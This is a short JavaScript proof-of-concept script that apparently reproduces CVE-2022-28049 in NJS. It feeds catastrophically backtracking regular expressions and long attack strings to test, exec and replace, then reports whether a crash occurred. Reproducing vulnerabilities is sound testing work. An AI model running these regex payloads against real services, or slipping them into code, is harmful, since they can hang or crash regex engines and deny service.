// CVE-2022-28049 Proof of Concept
// Target: NJS versions with RegExp vulnerabilities
// Type: Regular expression processing vulnerability

function main() {
    console.log("Starting CVE-2022-28049 reproduction...");
    
    try {
        // Create complex regular expressions that may trigger the vulnerability
        const maliciousPattern = "(" + "a".repeat(1000) + ")*" + "b".repeat(1000);
        const testString = "a".repeat(2000) + "c";
        
        // Create RegExp object
        const regex = new RegExp(maliciousPattern);
        
        // Test operations that may trigger vulnerability
        console.log("Testing RegExp.test()...");
        const testResult = regex.test(testString);
        
        console.log("Testing RegExp.exec()...");
        const execResult = regex.exec(testString);
        
        // More complex regex operations
        const complexRegex = /(?:(?:a+)+)+b/;
        const attackString = "a".repeat(1000) + "c";
        
        console.log("Testing complex regex...");
        const complexResult = complexRegex.test(attackString);
        
        // String replace with complex regex
        const replaceResult = attackString.replace(complexRegex, "REPLACED");
        
        console.log("CVE-2022-28049: RegExp operations completed");
        console.log("Test result:", testResult);
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();